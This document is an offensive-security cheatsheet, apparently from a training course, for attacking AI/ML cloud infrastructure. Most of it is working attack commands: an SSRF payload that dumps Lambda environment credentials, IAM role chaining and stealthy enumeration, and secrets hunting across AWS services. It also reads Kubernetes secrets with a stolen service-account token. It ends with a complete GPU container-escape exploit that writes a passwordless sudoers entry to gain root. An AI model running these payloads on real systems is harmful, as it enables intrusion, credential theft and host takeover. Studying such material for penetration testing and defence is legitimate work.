# Module 09 — AI Infrastructure Cheatsheet

## SSRF → Lambda ENV Dump
```bash
curl -s "https://APIGATEWAY_URL/prod/api/export?template_url=file:///proc/self/environ" \
  | jq -r '.report' | tr '\0' '\n' | grep -E '^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|BACKEND_ROLE_ARN|SAGEMAKER_ENDPOINT)='
```

## IAM Role Chain (Megacorp One pattern)
```
Lambda role → DataScientistRole → MLOpsRole → SageMakerExecutionRole
```
```bash
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/MLOpsRole --role-session-name "pea-deploy"
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/SageMakerExecutionRole --role-session-name "training-run"
```

## Enumerate IAM (stealth order)
```bash
# Inline policies first (less restricted than attached)
aws iam list-role-policies --role-name ROLE
aws iam get-role-policy --role-name ROLE --policy-name POLICY
aws iam list-attached-role-policies --role-name ROLE   # may be denied
aws iam list-roles --query 'Roles[?starts_with(RoleName,`DataScientist`) || ...].RoleName'
aws iam get-role --role-name ROLE --query 'Role.AssumeRolePolicyDocument'
```

## Secrets Hunting — 5 Services
```bash
# S3
aws s3 ls && aws s3 ls s3://BUCKET/ --recursive
aws s3api list-object-versions --bucket BUCKET   # deleted file recovery

# SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameters-by-path --path "/PREFIX/" --recursive --with-decryption
aws ssm get-parameter-history --name "PARAM" --with-decryption   # old passwords

# CloudWatch logs
aws logs describe-log-groups
aws logs filter-log-events --log-group-name "GROUP" --filter-pattern "password OR key OR secret OR token"
aws logs get-log-events --log-group-name "GROUP" --log-stream-name "STREAM"

# Model Registry
aws sagemaker list-model-package-groups
aws sagemaker describe-model-package --model-package-name ARN
# → Container.Environment has tokens; CustomerMetadataProperties has pipeline map

# ECR image
aws ecr get-login-password | docker login --username AWS --password-stdin ACCOUNT.dkr.ecr.REGION.amazonaws.com
docker pull IMAGE && docker inspect --format '{{json .Config.Env}}' IMAGE | jq -r '.[]'
```

## EC2/vLLM Exposure Check
```bash
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" \
  --query 'Reservations[*].Instances[*].{ID:InstanceId,PublicIP:PublicIpAddress,SG:SecurityGroups[0].GroupName}'
aws ec2 describe-security-groups --filters "Name=group-name,Values=SG_NAME"
curl -s http://PUBLIC_IP:8000/v1/models | jq   # unauthenticated check
curl -s http://PUBLIC_IP:8000/version | jq     # version for CVE research
```

---

## Kubernetes — Kubeconfig & Certificate Analysis
```bash
kubectl config view --raw
kubectl config view --raw -o jsonpath='{.users[0].user.client-certificate-data}' \
  | base64 -d | openssl x509 -text -noout | grep Subject
# CN=username, O=group (check for system:masters)
```

## Permissions Audit
```bash
# External (Aisha's identity)
kubectl auth can-i --list -n NAMESPACE

# Internal (from inside pod, without kubectl)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"TARGET_NS"}}' \
  | jq '.status.resourceRules[] | select(.resources != null) | {verbs, resources}'
```

## Namespace / Secret Enumeration (as inference-sa)
```bash
# List namespaces
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces \
  | jq -r '.items[].metadata.name'

# List secrets in namespace
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/pipeline-system/secrets \
  | jq -r '.items[] | "\(.metadata.name)\t\(.type)"'

# Read a secret
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/pipeline-system/secrets/minio-credentials \
  | jq '{key: (.data.accesskey | @base64d), secret: (.data.secretkey | @base64d)}'

# Decode SA token JWT payload
curl -s ... | jq -r '.data.token' | base64 -d | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

## RBAC Structure Discovery
```bash
# Find ClusterRoleBinding for a service account
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  | jq '.items[] | select(.subjects[]?.name == "SA_NAME") | {name: .metadata.name, role: .roleRef.name}'

# Read the ClusterRole
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles/ROLE_NAME \
  | jq '{name: .metadata.name, rules: .rules}'
```

## Multi-Container Pod Inspection
```bash
# Pod architecture (from inside another pod)
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/ml-inference/pods/model-pipeline \
  | jq '{initContainers: [.spec.initContainers[].name], containers: [.spec.containers[].name], volumes: [.spec.volumes[].name]}'

# Exec into specific container
kubectl exec -it model-pipeline -c pre-processor -n ml-inference -- /bin/sh
```

## CVE-2025-23266 — GPU Host Escape via LD_PRELOAD

### Detect vulnerable stack
```bash
dpkg-query -W nvidia-container-toolkit   # 1.17.7
runc --version                           # 1.2.6
grep cuda-compat-mode /etc/nvidia-container-runtime/config.toml  # hook
```

### Payload (cuda_compat_shim.c)
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
__attribute__((constructor))
static void init(void) {
    unsetenv("LD_PRELOAD");
    FILE *f = fopen("/etc/sudoers.d/cuda-compat-update","w");
    if(f){fprintf(f,"USER ALL=(ALL) NOPASSWD: ALL\n");fclose(f);chmod("/etc/sudoers.d/cuda-compat-update",0440);}
}
```

### Dockerfile
```dockerfile
FROM busybox
ENV LD_PRELOAD=/proc/self/cwd/cuda_compat_shim.so
ADD cuda_compat_shim.so /
```

### Build and fire
```bash
gcc -shared -fPIC -nostartfiles -o /tmp/cuda-compat-build/cuda_compat_shim.so cuda_compat_shim.c
sudo /opt/ridgeline/tools/gpu-build.sh -t cuda-compat-hotfix -f /tmp/cuda-compat-build/Dockerfile /tmp/cuda-compat-build/
sudo /opt/ridgeline/tools/gpu-run.sh cuda-compat-hotfix echo done
sudo -i   # root
```

---

## Key Numbers & Facts
| Item | Value |
|------|-------|
| MLOpsRole trust principal | `arn:aws:iam::ACCOUNT:root` = any entity in account |
| AmazonSageMakerFullAccess S3 scope | `s3:*` on `*` — breaks all project boundaries |
| SA token mount path | `/var/run/secrets/kubernetes.io/serviceaccount/token` |
| API server env vars | `KUBERNETES_SERVICE_HOST`, `KUBERNETES_SERVICE_PORT` |
| ClusterRoleBinding scope | ALL namespaces (vs Role = one namespace) |
| `automountServiceAccountToken: false` | Removes token mount entirely |
| `/proc/self/cwd` | Resolves to hook's CWD = container rootfs on host |
| GPU cgroups | No kernel GPU controller — all userspace |
